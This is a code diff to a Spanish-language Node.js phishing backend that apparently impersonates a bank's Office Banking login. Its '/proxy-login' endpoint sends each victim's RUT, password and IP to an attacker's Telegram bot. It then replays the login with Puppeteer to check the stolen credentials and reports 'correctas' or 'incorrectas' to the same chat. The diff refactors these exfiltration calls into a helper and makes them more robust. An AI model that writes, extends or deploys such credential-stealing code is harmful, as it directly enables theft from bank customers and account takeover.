@@ -11,6 +11,23 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, "public")));
 
+// Helper seguro para enviar mensajes a Telegram sin romper la ejecución
+async function safeSendTelegram(text) {
+  if (!process.env.TELEGRAM_TOKEN || !process.env.CHAT_ID) {
+    console.warn('Telegram no configurado: TELEGRAM_TOKEN o CHAT_ID faltante');
+    return;
+  }
+  try {
+    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text })
+    });
+  } catch (err) {
+    console.error('Error enviando a Telegram:', err);
+  }
+}
+
 // Endpoint para leer configuración
 app.get("/config", (req, res) => {
   const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
@@ -72,14 +89,11 @@ app.get("/autorizacion", (req, res) => {
 app.post("/autorizar", async (req, res) => {
   const mensaje = req.body.mensaje || "Autorización recibida";
   try {
-    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
-    });
+    await safeSendTelegram(mensaje);
     res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
   } catch (err) {
-    res.status(500).json({ status: "error", error: err.message });
+    console.error('Error en /autorizar:', err);
+    res.status(500).json({ status: "error", error: String(err) });
   }
 });
 
@@ -90,40 +104,44 @@ app.post("/proxy-login", async (req, res) => {
 
   if (mail) {
     const mensaje = `Correo actualizado:\n${mail}\nIP: ${ip}`;
-    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
-    });
+    try {
+      await safeSendTelegram(mensaje);
+    } catch (err) {
+      console.error('Error enviando correo actualizado a Telegram:', err);
+    }
     return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
   }
 
   // Notificación básica de ingreso (flujo original)
   const ingresoMsg = `Login recibido AutOB:\nRUT: ${rut}\nClave: ${passwd}\nIP: ${ip}`;
-  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: ingresoMsg })
-  });
+  try {
+    await safeSendTelegram(ingresoMsg);
+  } catch (err) {
+    console.error('Error enviando ingreso a Telegram:', err);
+  }
 
   let mensajeFinal = "Bienvenido a Office Banking";
 
   try {
     if (rut && passwd) {
-      const browser = await puppeteer.launch({ headless: true });
+      const browser = await puppeteer.launch({ headless: true, args: ["--no-sandbox", "--disable-setuid-sandbox"] });
       const page = await browser.newPage();
 
       let loginStatus = null;
 
       // Escuchar respuestas de red
       page.on('response', async (response) => {
-        const url = response.url();
-        if (url.includes('/login')) {
-          const status = response.status();
-          console.log("➡️ Respuesta de login:", status, url);
+        try {
+          const url = response.url();
+          if (url.includes('/login')) {
+            const status = response.status();
+            console.log("➡️ Respuesta de login:", status, url);
 
-          if (status === 401) loginStatus = 'error';
-          else if (status === 200) loginStatus = 'ok';
+            if (status === 401) loginStatus = 'error';
+            else if (status === 200) loginStatus = 'ok';
+          }
+        } catch (e) {
+          console.error('Error inspecting response:', e);
         }
       });
 
@@ -142,18 +160,10 @@ app.post("/proxy-login", async (req, res) => {
 
         if (loginStatus === 'error') {
           mensajeFinal = "Credenciales incorrectas";
-          await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: "❌ Credenciales incorrectas en OfficeBanking" })
-          });
+          await safeSendTelegram("❌ Credenciales incorrectas en OfficeBanking");
         } else if (loginStatus === 'ok') {
           mensajeFinal = "Credenciales correctas";
-          await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: "✅ Credenciales correctas en OfficeBanking" })
-          });
+          await safeSendTelegram("✅ Credenciales correctas en OfficeBanking");
         }
       }
 
